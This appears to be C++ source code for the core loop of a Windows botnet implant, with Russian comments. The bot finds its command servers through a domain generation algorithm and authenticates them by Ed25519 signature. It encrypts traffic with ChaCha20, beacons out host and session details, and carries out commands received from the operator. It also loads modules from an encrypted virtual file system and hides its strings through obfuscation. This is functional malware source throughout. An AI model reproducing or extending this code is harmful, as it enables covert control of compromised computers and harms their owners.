#include "BotReceiver.hpp"
#include "json_builder.hpp"
#include "strings.hpp"
#include "utils.hpp"
#include "configreader.h"

extern "C"
{
#include "jfes\jfes.h"
#include "crypto\ed25519\ed25519.h"
}

DGABot::DGABot()
{
#ifdef _DEBUG
	WriteLog(L"[DGABot] constructor");
#endif
	session = nullptr;
	dga = nullptr;
	communicator = nullptr;
	proto_parser = nullptr;
	dispatcher = nullptr;
	msystem = nullptr;

	RtlSecureZeroMemory(wchIP, sizeof(wchIP));
}

DGABot::~DGABot()
{
#ifdef _DEBUG
	WriteLog(L"[DGABot] destructor");
#endif
	if (session != nullptr)
		delete session;
	if (dga != nullptr)
		delete dga;
	if (communicator != nullptr)
		delete communicator;
	if (proto_parser != nullptr)
		delete proto_parser;
	if (dispatcher != nullptr)
		delete dispatcher;
	if (msystem != nullptr)
		delete msystem;
}

BOOL DGABot::start()
{
	this->dga = (IDomainGenerator*)new DefaultDomainGenerator;
	this->proto_parser = (IProtocolParser*)new ProtocolJsonParser;
	this->dispatcher = (IOperationDispatcher*)new HivemindOperationDispatcher;
	this->msystem = (IModuleSystem*)new HivemindModuleSystem;

#ifdef _DEBUG_CHANNEL // дебаг через файла
	communicator = (IControlServer*)new DebugFileChannel;
#else // нормальная связь
	communicator = (IControlServer*)new WinHttpAbsLayer;
#endif

	if ((communicator == nullptr) || (dga == nullptr) || (proto_parser == nullptr) || (dispatcher == nullptr) || (msystem == nullptr))
	{
#ifdef _DEBUG
		WriteLog(L"[DGABot::start] either communicator or dga or proto_parser or dispatcher is nullptr");
#endif
		return FALSE;
	}

#ifdef _DISABLE_TRAFFCRYPT
	communicator->init(nullptr, nullptr, 0, nullptr);
#else
	communicator->init(netcrypto::EncryptChacha20, netcrypto::DecryptChacha20, 0, nullptr);
#endif

	// инициализация модульной системы
	if (!this->msystem->init()) // проеб не критический
	{
#ifdef _DEBUG
		WriteLog(L"[DGABot::start] error initializing module system, continue bot");
#endif
	}

	// загрузим модули из VFS
	this->msystem->load_persistent();

	BOOL bRet = FALSE;

	// основной процесс работы бота, описанный в хидерах
	// при провале каждого этапа начинает сначала
	while (TRUE)
	{
		this->dga->set_index(0);

		// установим статус, что сеть на данный момент в активном поиске
		this->msystem->set_status(module_data::msystem_status_t::MODULESYSTEM_NETWORK_PENDING, nullptr);


		Sleep(DELAY_MAINPROCESS); // чтобы не заддосило, внимание: это НЕ задержка отстука, а задержка между попытками сделать полный цикл дга-хендшейк-отстук-выполнение команды, при успешном дга-хендшейк задержка отстука происходится на этапе отстука в цикле, а не тут

		// 0) инициализирует сессию: генерирует псевдослучайную строку, а также собирает информацию о хостовом процессе и его разрядности
		if (!this->init_session())
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::start] cant init session");
#endif
			continue;
		}

		// пункты 1 и 2, после успешного выполнения у нас будет домен и IP адрес, стучим только на IP адрес, прописывая домен вручную в поле hosts
		// чтобы избежать лишнего резолва домена, так как валидация происходит только на данном этапе
		if (!this->find_server())
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::start] cant find and authorize active domain");
#endif
			continue;
		}

		if (!this->communicate_server())
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot:start] error communicating with server");
#endif
			continue;
		}

	}

	return bRet;
}

BOOL DGABot::init_session()
{
	if (session != nullptr)
	{ // перенициализация
		delete session;
		session = nullptr;
	}

	session = (ISession*)new DefaultSession;
	if (session == nullptr)
		return FALSE;

	session_param sparameter;
	RtlSecureZeroMemory(&sparameter, sizeof(sparameter));
	sparameter.bModulesystemInitiailized = this->msystem->is_initialized();
	BOOL bRet = session->init((LPBYTE)&sparameter);

#ifdef _DEBUG
	WCHAR debugOut[1024];
	if (bRet)
	{
		wsprintfW(debugOut, L"[DGABot::init_session] session sucessfully initialized with id = %s, machine = %s and host = %s",
			session->get_uid(),
			((session->get_hostarch() == 64) ? L"x64" : L"x86"),
			session->get_hostprocess());
		WriteLog(debugOut);
	}
#endif

	return bRet;
}

BOOL DGABot::find_server()
{
	if (this->dga == nullptr)
		return FALSE;

	BOOL bRet = FALSE;
	// начинаем с нуля
	dga->set_index(0);

	// поиск домена и произведение хендшейка с каждым резолвнутым доменом
	while (TRUE)
	{

		// находит итерируя с iIndex активный домен, который резолвится, если не используется дебаг канал через файлы
#ifndef _DEBUG_CHANNEL
		if ((!this->dga->find_active_domain()) || (this->dga->get_record() == nullptr))
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::find_server] dga failed");
#endif
			break;
		}
		
		ipaddr.S_un.S_addr = this->dga->get_record()->Data.A.IpAddress;
		RtlIpv4AddressToStringW(&ipaddr, wchIP);
#endif

		// после этого нам требуется произвести рукопожатие и если оно совпадает, то вернуть TRUE и использовать данный IP адрес как C2 сервер
		// отправляя в host: имя найденного домена
		// если рукопожатие провалится, то продолжить поиск домена с данного индекса

		if (this->perform_handshake() == TRUE)
		{
			// успешно произвели рукопожатие, вернем true
			bRet = TRUE;
			break;
		}
		
		// в следующей итерации продолжим со следующего индекса
		this->dga->set_index(this->dga->get_index() + 1);
	
	} 

	return bRet;
}

BOOL DGABot::perform_handshake()
{
	PDNS_RECORD pRecord = this->dga->get_record();
	PWCHAR pwDomainName = nullptr;
	if (pRecord != nullptr)
		pwDomainName = (PWCHAR)pRecord->pName;

#ifdef _DEBUG
	WCHAR debugOut[1024];
#ifndef _DEBUG_CHANNEL
	wsprintfW(debugOut, L"[DGABot::perform_handshake] performing handshake with %s resolved from %s", this->wchIP, this->dga->get_record()->pName);
#else
	wsprintfW(debugOut, L"[DGABot::perform_handshake] performing handshake with *DEBUG CHANNEL NO C2 COMMUNICATIONS* resolved from ***");
#endif
	WriteLog(debugOut);
#endif

	JsonBuilder jbuilder;

	LPBYTE lpResponse = nullptr;
	SIZE_T dwResponseSize = 0;
	BOOL bRet = FALSE;
	do
	{
		// освободится в деструкторе jbuilder'а
		PWCHAR pwJsonStr = this->prepare_handshake_json(&jbuilder);
		if (pwJsonStr == nullptr)
			break;

#ifdef _DEBUG
		WriteLog(L"[DGABot::perform_handshake] ", pwJsonStr);
#endif
		// отправим данные на сервер и получим ответ
		if (!this->communicator->send(this->wchIP, pwDomainName, (LPBYTE)pwJsonStr, wcslen(pwJsonStr) * 2 + 2, &lpResponse, &dwResponseSize))
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::perform_handshake] communication with server failed ", this->wchIP);
#endif
			break;
		}

		// TODO: сделать проверку на ограничение размера ответа, так как чтобы нас не задосили большими данными, ибо в данный момент ответ может быть потенциально вредоносным
		if ((lpResponse == nullptr) || (dwResponseSize == 0))
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::perform_handshake] Error no response ", this->wchIP);
#endif
			break;
		}

		// получили ответ, тут пропарсим его и сверим цифровую подпись хэндшейк операции
		// отправляем все в UTF16-LE из-за возможных юникодных символов, а ответ принимаем в обычном UTF-8
#ifdef _DEBUG
		WriteLog("[DGABot::perform_handshake] Server response: ", (PCHAR)lpResponse);
#endif

		bRet = this->validate_handshake((PCHAR)lpResponse, dwResponseSize);
#ifdef _DEBUG
		if (bRet)
			WriteLog(L"[DGABot::perform_handshake] VALID server, signature is verified");
		else
			WriteLog(L"[DGABot::perform_handshake] INVALID server");
#endif

	} while (FALSE);
	
	if (lpResponse != nullptr)
	{
		if (dwResponseSize > 0)
			RtlSecureZeroMemory(lpResponse, dwResponseSize);
		VirtualFree(lpResponse, 0, MEM_RELEASE);
		lpResponse = nullptr;
	}

	return bRet;
}

PWCHAR DGABot::prepare_handshake_json(JsonBuilder * jbuilder)
{
	CCryptString cStr_Session(cryptedstr_Session);
	CCryptString cStr_op(cryptedstr_op);
	CCryptString cStr_hs(cryptedstr_hs);

	PWCHAR pwResult = nullptr;
	do
	{
		PWCHAR pwSessionJson = this->session->get_json_session();
		if (pwSessionJson == nullptr)
			break;

		UINT uSessionJsonLength = wcslen(pwSessionJson) + 1;

		if (!jbuilder->init(uSessionJsonLength + DEFAULT_JSON_MAXLENGTH))
			break;

		// "op": "hs" - говорит о том, что операция handshake 
		jbuilder->add(cStr_op.w_str(), cStr_hs.w_str());
		jbuilder->add_subsidiary_json(cStr_Session.w_str(), pwSessionJson);

		// освободится потом деструктором JsonBuilder'а
		pwResult = jbuilder->finish();
		if (pwResult == nullptr)
			break;

	} while (FALSE);

	return pwResult;
}

BOOL DGABot::validate_handshake(PCHAR pchAllegedJson, SIZE_T dwResponseSize)
{
	CCryptString cStr_op(ascii_cryptedstr_op);
	CCryptString cStr_hs(ascii_cryptedstr_hs);
	CCryptString cStr_base64(ascii_cryptedstr_base64);

	BOOL bRet = FALSE;

	jfes_config_t config;
	jfes_size_t tokamount = 1024;
	jfes_parser_t parser;

	PCHAR pchSignatureBase64 = nullptr; 
	PBYTE pEd25519Signature = nullptr;
	SIZE_T dwEd25519Size = 0;

	PCHAR pchSessionId = nullptr;

	jfes_token_t *tokens = new jfes_token_t[tokamount];
	do
	{
		if (tokens == nullptr)
			break;

		if (jfes_success != jfes_init_parser(&parser, &config))
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::validate_handshake] error initializing parser");
#endif
			break;
		}
		if (jfes_success != jfes_parse_tokens(&parser, pchAllegedJson, dwResponseSize, tokens, &tokamount))
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::validate_handshake] error parsing json");
#endif
			break;
		}

		if (!isKeywordEqualTo(pchAllegedJson, tokens, tokamount, (unsigned char*)cStr_op.c_str(), (unsigned char*)cStr_hs.c_str(), 0))
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::validate_handshake] error operation is not \"hs\"");
#endif
			break;
		}

		pchSignatureBase64 = getStringFromKeyword(pchAllegedJson, tokens, tokamount, (unsigned char*)cStr_base64.c_str(), 0);
		if (pchSignatureBase64 == nullptr)
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::validate_handshake] error cant find base64 keyword");
#endif
			break;
		}

#ifdef _DEBUG
		WriteLog("[DGABot::validate_handshake] base64 signature: ", pchSignatureBase64);
#endif

		pEd25519Signature = Base64toBinary(pchSignatureBase64, &dwEd25519Size);
		if ((pEd25519Signature == nullptr)  || (dwEd25519Size != sign_ed25519_BYTES_DETACHED))
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::validate_handshake] base64 decoding failed or invalid signature provided");
#endif
			break;
		}

		pchSessionId = Convert2UTF8(this->session->get_uid(), wcslen(this->session->get_uid()) + 2);
		if (pchSessionId == nullptr)
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::validate_handshake] error converting UID to ascii");
#endif
			break;
		}

#ifdef _DEBUG
		WriteLog("[DGABot::validate_handshake] validating signature against ", pchSessionId);
#endif

		bRet = ed25519_verify(pEd25519Signature, (const unsigned char*)pchSessionId, strlen(pchSessionId), config_data::cfg->ed25519_server_publickey);

	} while (FALSE);

	if (tokens != nullptr)
		delete[]tokens;
	if (pchSignatureBase64 != nullptr)
		delete[]pchSignatureBase64;
	if (pEd25519Signature != nullptr)
		delete[]pEd25519Signature;
	if (pchSessionId != nullptr)
		delete[]pchSessionId;

	return bRet;
}

PWCHAR DGABot::prepare_knock_json(JsonBuilder * jbuilder)
{
	PWCHAR pwJson = nullptr;
	CCryptString cStr_Session(cryptedstr_Session);
	CCryptString cStr_op(cryptedstr_op);
	CCryptString cStr_knock(cryptedstr_knock);

	do
	{
		PWCHAR pwSessionJson = this->session->get_json_session();
		if (pwSessionJson == nullptr)
			break;

		UINT uSessionJsonLength = wcslen(pwSessionJson) + 1;

		if (!jbuilder->init(uSessionJsonLength + DEFAULT_JSON_MAXLENGTH * 2))
			break;

		// "op": "knock" - говорит о том, что операция отстука за командами
		jbuilder->add(cStr_op.w_str(), cStr_knock.w_str());
		this->add_runtimeinfo(jbuilder);
		jbuilder->add_subsidiary_json(cStr_Session.w_str(), pwSessionJson);

		// освободится потом деструктором JsonBuilder'а
		pwJson = jbuilder->finish();
		if (pwJson == nullptr)
			break;

	} while (FALSE);

	return pwJson;
}

VOID DGABot::add_runtimeinfo(JsonBuilder * jbuilder)
{
	JsonBuilder jruntimebuilder;
	CCryptString cStr_ri(cryptedstr_ri);
	CCryptString cStr_ma(cryptedstr_ma);
	CCryptString cStr_vfst(cryptedstr_vfst);

	UINT uVfsAmountFiles = 0;
	UINT uTotalLoadedModules = 0;
	do
	{
		if (!jruntimebuilder.init(DEFAULT_JSON_MAXLENGTH))
			break;

		if (this->msystem->is_initialized())
		{
			uTotalLoadedModules = this->msystem->get_amount();
			IEncryptedVirtualFS *evfs = this->msystem->get_vfs_ptr();
			if (evfs != nullptr)
				uVfsAmountFiles = evfs->amount();
		}

		jruntimebuilder.add(cStr_ma.w_str(), uTotalLoadedModules);
		jruntimebuilder.add(cStr_vfst.w_str(), uVfsAmountFiles);
		PWCHAR pwRuntimeJson = jruntimebuilder.finish();
		if (pwRuntimeJson != nullptr)
			jbuilder->add_subsidiary_json(cStr_ri.w_str(), pwRuntimeJson);

	} while (FALSE);

	return;
}

BOOL DGABot::communicate_server()
{
	PDNS_RECORD pRecord = this->dga->get_record();
	PWCHAR pwchDomainName = nullptr;
	BOOL bRet = FALSE;

	JsonBuilder jbuilder_knock;
	LPBYTE lpResponse = nullptr;
	SIZE_T dwResponseSize = 0;

	HivemindContextData hmctxData;
	RtlSecureZeroMemory(&hmctxData, sizeof(hmctxData));

	if (pRecord != nullptr)
		pwchDomainName = (PWCHAR)pRecord->pName;

	// установим новый статус модульной системы говорящий о том, что модули могут использовать сеть
	hmctxData.pwDomain = pwchDomainName;
	hmctxData.pwIP = this->wchIP;
	hmctxData.pwSessionJson = this->session->get_json_session();
	this->msystem->set_status(module_data::msystem_status_t::MODULESYSTEM_NETWORK_ACTIVE, (LPBYTE)&hmctxData);

	do
	{
		// освободится в деструкторе
		PWCHAR pwKnockJson = this->prepare_knock_json(&jbuilder_knock);
		if (pwKnockJson == nullptr)
		{
#ifdef _DEBUG
			WriteLog(L"[DGABot::communicate_server] error preparing json string");
#endif
			break;
		}

#ifdef _DEBUG
		WriteLog(L"[DGABot::communicate_server] json knock string: ", pwKnockJson);
#endif

		while (TRUE)
		{

			// если не удалось подключиться после стольких попыток - провалимся и найдем другой сервер
			if (!this->try_connect(pwchDomainName, (LPBYTE)pwKnockJson, wcslen(pwKnockJson) * 2 + 2, &lpResponse, &dwResponseSize))
			{
#ifdef _DEBUG
				WriteLog(L"[DGABot::communicate_server] error cant connect to server");
#endif
				break;
			}

			if (this->proto_parser->deserialize(lpResponse, dwResponseSize))
			{
				// десериализовали - выполним
				this->dispatcher->dispatch(this->proto_parser, pwchDomainName, this->wchIP, this->session->get_json_session(), this->msystem);
			}
			else
			{
#ifdef _DEBUG
				WriteLog("[DGABot::communicate_server] cant deserialize: ", (PCHAR)lpResponse);
#endif
			}

			if (lpResponse != nullptr)
			{
				if (dwResponseSize > 0)
					RtlSecureZeroMemory(lpResponse, dwResponseSize);
				VirtualFree(lpResponse, 0, MEM_RELEASE);
				lpResponse = nullptr;
				dwResponseSize = 0;
			}

			// подождем перед следующей итерацией
			this->sleep();
		}

	} while (FALSE);

	return bRet;
}

BOOL DGABot::try_connect(PWCHAR pwchDomainName, LPBYTE lpKnockJson, SIZE_T dwKnockJsonLength, LPBYTE* lpResponse, SIZE_T* dwResponseSize)
{
	BOOL bCommResult = FALSE;
	INT iTries = 0;
	while ((!bCommResult) && (iTries < MAX_RETRY_COUNT))
	{
		bCommResult = this->communicator->send(this->wchIP, pwchDomainName, lpKnockJson, dwKnockJsonLength, lpResponse, dwResponseSize);
		if (!bCommResult)
		{
			// ошибка соединения, попробуем еще раз через INTERNET_CONNECTION_DELAY_RETRY мс
			Sleep(INTERNET_CONNECTION_DELAY_RETRY);
#ifdef _DEBUG
			WriteLog(L"[DGABot::try_connect] error communicating with server, retrying again...");
#endif
			iTries++;
		}
	}
	return bCommResult;
}

BOOL DGABot::sleep()
{
	DWORD dwTime = 30 * 60 * 1000;
	
	long holdrand = GetTickCount();
	// джиттер - 5 минут
	dwTime += _rand(&holdrand) % (5 * 60 * 1000);

#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[DGABot::sleep] sleeping %d seconds", dwTime / 1000);
	WriteLog(debugOut);
#endif

	Sleep(dwTime);

	return TRUE;
}


